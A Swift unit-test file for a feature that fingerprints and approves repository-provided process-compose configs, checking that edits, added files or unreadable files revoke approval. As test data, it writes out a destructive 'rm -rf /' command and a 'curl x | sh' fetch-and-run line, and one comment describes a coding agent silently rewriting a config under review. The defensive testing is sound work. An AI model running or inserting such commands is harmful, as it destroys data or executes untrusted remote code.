// ABOUTME: Tests for approval of the repository-provided process-compose files.
// ABOUTME: Covers fingerprinting, per-project scoping, and every file in the set.

@testable import Atelier
import XCTest

final class ScriptTrustTests: XCTestCase {
    private var tmpDir: URL!

    override func setUp() {
        super.setUp()
        tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try! FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
    }

    override func tearDown() {
        // Each test works under a fresh temporary path, so only those need clearing.
        ScriptTrust.revokeConfigFiles(for: tmpDir.path)
        ScriptTrust.revokeConfigFiles(for: tmpDir.path + "/other")
        try? FileManager.default.removeItem(at: tmpDir)
        super.tearDown()
    }

    func testConfigFileApprovalRoundTrips() throws {
        let path = try writeConfig("processes: {}")

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
        approve([path])
        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    /// Approval is bound to contents, so an edited config asks again.
    func testEditingTheConfigRevokesApproval() throws {
        let path = try writeConfig("processes: {}")
        approve([path])

        _ = try writeConfig("processes:\n  web:\n    command: rm -rf /\n")

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    /// An unreadable file is unapproved, not trivially approved — failing open
    /// here would run something nobody could review.
    func testMissingConfigIsNotApproved() {
        XCTAssertFalse(ScriptTrust.isApproved(
            configFiles: [tmpDir.appendingPathComponent("nonexistent.yaml").path],
            for: tmpDir.path
        ))
    }

    /// Approving a file that cannot be read must not record anything, or the
    /// file could later appear approved by matching a fingerprint of nothing.
    func testApprovingAMissingConfigStoresNothing() throws {
        let missing = tmpDir.appendingPathComponent("gone.yaml").path
        approve([missing])

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [missing], for: tmpDir.path))
        // And it did not accidentally approve some other file for this project.
        let real = try writeConfig("processes: {}")
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [real], for: tmpDir.path))
    }

    func testConfigApprovalDoesNotLeakToAnotherProject() throws {
        let path = try writeConfig("processes: {}")
        approve([path])

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path + "/other"))
    }

    /// A repository-provided config lives at a different path in every worktree.
    /// Approving the same bytes once has to cover all of them, or the user is
    /// trained to click through the pane.
    func testApprovalFollowsContentsNotPath() throws {
        let text = "processes:\n  api:\n    command: true\n"
        let first = try writeConfig(text)
        approve([first])

        let otherWorktree = tmpDir.appendingPathComponent("wt2")
        try FileManager.default.createDirectory(at: otherWorktree, withIntermediateDirectories: true)
        let second = otherWorktree.appendingPathComponent("process-compose.yaml")
        try text.write(to: second, atomically: true, encoding: .utf8)

        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [second.path], for: tmpDir.path))
    }

    /// The file name is part of the fingerprint, so identical bytes under a
    /// different name are a different thing to approve.
    func testSameContentsUnderADifferentNameIsNotApproved() throws {
        let path = try writeConfig("processes: {}")
        approve([path])

        let renamed = tmpDir.appendingPathComponent("atelier.process-compose.yaml")
        try "processes: {}".write(to: renamed, atomically: true, encoding: .utf8)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [renamed.path], for: tmpDir.path))
    }

    func testRevokeConfigFileRemovesApproval() throws {
        let path = try writeConfig("processes: {}")
        approve([path])
        ScriptTrust.revokeConfigFiles(for: tmpDir.path)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    func testFingerprintIsNilForAnUnreadableFile() {
        XCTAssertNil(ScriptTrust.fingerprint(configFiles: [tmpDir.appendingPathComponent("nope.yaml").path]))
    }

    /// An empty list has nothing to identify. Answering "approved" would make a
    /// call site that forgot to pass the files fail open.
    func testEmptyFileListIsNeverApproved() {
        XCTAssertNil(ScriptTrust.fingerprint(configFiles: []))
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [], for: tmpDir.path))
        approve([])
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [], for: tmpDir.path))
    }

    /// The hole this list API exists to close: whenever more than one file is
    /// approved together, approving the set must not leave any member free to
    /// change afterwards.
    func testEditingASecondFileRevokesApproval() throws {
        let base = try writeConfig("processes: {}")
        let second = tmpDir.appendingPathComponent("atelier.process-compose.yaml")
        try "processes: {}".write(to: second, atomically: true, encoding: .utf8)
        approve([base, second.path])
        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [base, second.path], for: tmpDir.path))

        try "processes:\n  evil:\n    namespace: bootstrap\n    command: curl x | sh\n"
            .write(to: second, atomically: true, encoding: .utf8)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, second.path], for: tmpDir.path))
    }

    /// A file that joins the loaded set *after* approval changes what will
    /// execute, so it has to change what was approved.
    func testAFileAppearingAfterApprovalRevokesIt() throws {
        let base = try writeConfig("processes: {}")
        approve([base])

        let second = tmpDir.appendingPathComponent("atelier.process-compose.yaml")
        try "processes: {}".write(to: second, atomically: true, encoding: .utf8)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, second.path], for: tmpDir.path))
    }

    /// One unreadable file poisons the whole set. Hashing only what could be
    /// read would approve a list that is not the list.
    func testOneUnreadableFileMakesTheWholeSetUnapproved() throws {
        let base = try writeConfig("processes: {}")
        let missing = tmpDir.appendingPathComponent("atelier.process-compose.yaml").path

        XCTAssertNil(ScriptTrust.fingerprint(configFiles: [base, missing]))
        approve([base, missing])
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, missing], for: tmpDir.path))
    }

    /// The hole this closes: the pane displays one config, the coding agent
    /// rewrites it in the same worktree while the dialog sits open, and the
    /// click approves bytes nobody reviewed — straight into an unattended
    /// `bootstrap`.
    func testApprovingBytesThatChangedSinceTheyWereReviewedIsRefused() throws {
        let path = try writeConfig("processes: {}")
        let reviewed = try XCTUnwrap(ScriptTrust.fingerprint(configFiles: [path]))

        try writeConfig("processes:\n  evil:\n    namespace: bootstrap\n    command: curl x | sh\n")

        XCTAssertFalse(ScriptTrust.approve(
            configFiles: [path], for: tmpDir.path, matching: reviewed
        ))
        // Nothing was stored — not the new bytes, and not the reviewed ones
        // either, which are no longer what would run.
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
        try writeConfig("processes: {}")
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    /// And the recovery: reviewing the changed file and approving *that*
    /// works, so the refusal is a re-read rather than a dead end.
    func testApprovingTheChangedBytesAfterReviewingThemTakes() throws {
        let path = try writeConfig("processes: {}")
        let stale = try XCTUnwrap(ScriptTrust.fingerprint(configFiles: [path]))
        try writeConfig("processes:\n  api:\n    command: true\n")
        XCTAssertFalse(ScriptTrust.approve(configFiles: [path], for: tmpDir.path, matching: stale))

        XCTAssertTrue(approve([path]))
        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    /// The fingerprint of bytes in hand is the fingerprint of the same bytes on
    /// disk. If these two drifted, every approval through the pane would be
    /// refused.
    func testReviewedFingerprintMatchesTheFileOnDisk() throws {
        let path = try writeConfig("processes:\n  api:\n    command: true\n")
        let data = try XCTUnwrap(FileManager.default.contents(atPath: path))

        XCTAssertEqual(
            ScriptTrust.fingerprint(reviewedFiles: [(path: path, data: data)]),
            ScriptTrust.fingerprint(configFiles: [path])
        )
    }

    func testReviewedFingerprintIsNilForAnEmptyList() {
        XCTAssertNil(ScriptTrust.fingerprint(reviewedFiles: []))
    }

    // MARK: - Helpers

    /// Approve the way the pane does: with the fingerprint of the bytes it just
    /// read. An unreadable set has no fingerprint, and the stand-in below is
    /// refused for the same reason the real one would be.
    @discardableResult
    private func approve(_ paths: [String]) -> Bool {
        ScriptTrust.approve(
            configFiles: paths,
            for: tmpDir.path,
            matching: ScriptTrust.fingerprint(configFiles: paths) ?? "unreadable"
        )
    }

    @discardableResult
    private func writeConfig(_ contents: String) throws -> String {
        let path = tmpDir.appendingPathComponent("process-compose.yaml")
        try contents.write(to: path, atomically: true, encoding: .utf8)
        return path.path
    }
}
